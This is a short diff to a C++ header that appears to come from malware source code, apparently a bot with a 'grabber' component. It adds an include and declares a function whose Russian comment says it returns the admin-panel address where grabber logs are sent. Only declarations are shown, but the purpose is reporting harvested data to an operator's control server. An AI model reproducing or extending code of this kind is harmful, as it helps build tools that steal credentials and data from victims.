@@ -22,6 +22,7 @@
 #include "Strings.h"
 #include "Strings.h"
 #include "BotConfig.h"
+#include "JavaConfig.h"
 
 
 
@@ -84,6 +85,12 @@ void AzCheckScriptHosts();
 string AzGetScriptHost();
 
 
+
+//------------------------------------------------------
+//  GetAzGrabberURL - Функция возвращает адрес в админке
+//  AZ для отправки лога грабера
+//------------------------------------------------------
+string GetAzGrabberURL(const string& SystemName,  const char* Action = NULL);
 
 //---------------------------------------------------------------------------
 #endif
